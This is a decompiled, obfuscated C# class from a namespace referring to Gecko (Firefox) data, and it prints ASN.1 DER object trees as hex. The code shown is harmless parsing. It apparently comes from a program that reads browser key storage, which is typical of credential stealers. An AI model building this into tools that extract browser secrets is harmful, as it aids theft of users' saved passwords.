using System;
using System.Collections.Generic;
using System.Text;

namespace NoiseMe.Drags.App.Data.Gecko
{
	// Token: 0x0200019A RID: 410
	public class нкрпар
	{
		// Token: 0x17000328 RID: 808
		// (get) Token: 0x06000CE3 RID: 3299 RVA: 0x000099EC File Offset: 0x00007BEC
		// (set) Token: 0x06000CE4 RID: 3300 RVA: 0x000099F4 File Offset: 0x00007BF4
		public ггорол ObjectType { get; set; }

		// Token: 0x17000329 RID: 809
		// (get) Token: 0x06000CE5 RID: 3301 RVA: 0x000099FD File Offset: 0x00007BFD
		// (set) Token: 0x06000CE6 RID: 3302 RVA: 0x00009A05 File Offset: 0x00007C05
		public byte[] ObjectData { get; set; }

		// Token: 0x1700032A RID: 810
		// (get) Token: 0x06000CE7 RID: 3303 RVA: 0x00009A0E File Offset: 0x00007C0E
		// (set) Token: 0x06000CE8 RID: 3304 RVA: 0x00009A16 File Offset: 0x00007C16
		public int ObjectLength { get; set; }

		// Token: 0x1700032B RID: 811
		// (get) Token: 0x06000CE9 RID: 3305 RVA: 0x00009A1F File Offset: 0x00007C1F
		// (set) Token: 0x06000CEA RID: 3306 RVA: 0x00009A27 File Offset: 0x00007C27
		public List<нкрпар> Objects { get; set; }

		// Token: 0x06000CEB RID: 3307 RVA: 0x00009A30 File Offset: 0x00007C30
		public нкрпар()
		{
			this.Objects = new List<нкрпар>();
		}

		// Token: 0x06000CEC RID: 3308 RVA: 0x00029634 File Offset: 0x00027834
		public override string ToString()
		{
			StringBuilder stringBuilder = new StringBuilder();
			StringBuilder stringBuilder2 = new StringBuilder();
			ггорол objectType = this.ObjectType;
			switch (objectType)
			{
			case ггорол.Integer:
				foreach (byte b in this.ObjectData)
				{
					stringBuilder2.AppendFormat("{0:X2}", b);
				}
				stringBuilder.Append("\tINTEGER ").Append(stringBuilder2).AppendLine();
				break;
			case ггорол.BitString:
			case ггорол.Null:
				break;
			case ггорол.OctetString:
				foreach (byte b2 in this.ObjectData)
				{
					stringBuilder2.AppendFormat("{0:X2}", b2);
				}
				stringBuilder.Append("\tOCTETSTRING ").AppendLine(stringBuilder2.ToString());
				break;
			case ггорол.ObjectIdentifier:
				foreach (byte b3 in this.ObjectData)
				{
					stringBuilder2.AppendFormat("{0:X2}", b3);
				}
				stringBuilder.Append("\tOBJECTIDENTIFIER ").AppendLine(stringBuilder2.ToString());
				break;
			default:
				if (objectType == ггорол.Sequence)
				{
					stringBuilder.AppendLine("SEQUENCE {");
				}
				break;
			}
			foreach (нкрпар нкрпар in this.Objects)
			{
				stringBuilder.Append(нкрпар.ToString());
			}
			if (this.ObjectType == ггорол.Sequence)
			{
				stringBuilder.AppendLine("}");
			}
			stringBuilder2.Remove(0, stringBuilder2.Length - 1);
			return stringBuilder.ToString();
		}
	}
}
